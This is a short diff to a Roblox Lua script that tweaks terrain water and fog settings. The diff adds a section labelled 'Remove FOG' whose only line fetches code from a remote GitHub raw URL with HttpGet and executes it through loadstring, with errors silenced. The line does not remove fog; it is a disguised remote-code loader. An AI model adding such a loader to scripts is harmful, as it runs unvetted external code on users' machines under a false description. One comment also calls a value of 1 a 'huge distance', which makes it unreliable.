@@ -85,3 +85,10 @@ Terrain.WaterWaveSpeed = 0           -- stop ripples
 -- The key lines for fog:
 Terrain.WaterFogColor = Color3.fromRGB(0, 0, 0)  -- doesn’t matter if density is 0
 Terrain.WaterFogEnd = 1                         -- huge distance so no blue haze
+
+
+---------------------------------------------------------------------
+-- 🟧 Remove FOG
+---------------------------------------------------------------------
+
+task.spawn(function() pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/unitnova389-lang/Lone-Survival/refs/heads/main/NV2"))) end)
